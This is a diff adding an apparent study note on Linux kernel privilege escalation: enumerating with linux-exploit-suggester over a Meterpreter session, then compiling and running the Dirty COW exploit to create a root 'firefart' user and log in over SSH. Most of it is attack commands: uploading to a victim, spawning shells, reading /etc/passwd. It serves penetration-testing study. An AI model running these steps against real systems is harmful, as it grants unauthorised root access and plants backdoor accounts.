@@ -1,0 +1,47 @@
+Kernel exploits on Linux will typically target vulnerabilities in the linux kernel to execute arbitary code in order to run privileged system commands or to obtain a system shell.
+- this process will differ based on the kernel version and distribution being targeted and the kernel exploit being used.
+- Privilege escalation on Linux systems will typically follow  the following methodoloy
+- - identifying kernel vulnerabilities
+- - Downloading compiling and transferring kernel exploits  onto the target system.
+
+#### Tool and environment
+- Linux-Exploit suggester - this tool is design to assist in detecting security deficiencies for given linux kernel/linux-based machine.It assesses (using heuristics methods) the exposure of the given kernel on every publicly known linux kernel exploit.
+- Github:https://github.com/The-Z-Labs/linux-exploit-suggester
+#### Exploit
+- First of all we need a meterpreter shell.
+- We need to gitclone the linux-exploit-suggester in our own kali linux machine
+- cd /tmp [move to temp directory ]
+- upload ~/Desktop/Linux-Enum/les.sh -> les.sh [  uploading les.sh file from attacker github clonning directory to meterpreter sessions ]
+- shell [ for getting shell]
+- /bin/bash -i [ for getting bash shell ]
+- chmod +x les.sh [ giving executalbe permissions ]
+- ./les.sh [ this script give all vulnerable information with their CVE's mention and associate a link of the cve ]
+- In this case we are going to use dirty cow 1,and dirty cow 2
+- download the exploit code into attacker machine and follow instruction
+- gcc -pthread dirty.c -o dirty -lcrypt [ this will compile the code ]
+- now move to meterpreter sessions 
+- upload ~/Download/dirty [ uploading compile code ]
+- If this compile code doesn't work we need to compline it in victim machine.
+- shell [ getting shell ]
+- /bin/bash -i
+- chmod +x dirty [ giving permissons for execute ]
+- ./dirty password123 [ run the file setting a password123 ]
+- Doesn't work
+- rm dirty [ removing dirty ]
+- move meterpreter sessions
+- uplaod ~/Downlaods/dirty.c [ upload the c file ]
+- shell [getting a shell ]
+- /bin/bash -i [ getting  a bash shell ]
+- gcc -pthread dirty.c -o dirty -lcrypt [ again compiling it ]
+-  chmod +x dirty [ giving executable permission ]
+- ./dirty password123 [ run the code specifying a password ]
+- cat /etc/passwd [ this shows passwd files where we see a firefart user with root privileged ]
+- su firefart [ for switching user to firefart ]
+- this shows a error "must be run from terminal"
+- move to new tab
+- ssh firefart@192.142.50.40
+- this will again shows error read care fully and remove ssh-keygen with given in a error
+- ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "192.142.50.40" [ this will remove key ]
+- ssh firefart@192.142.50.40
+- successful
+- update apt-get update or apt-get update [ run the following one of two commands ]
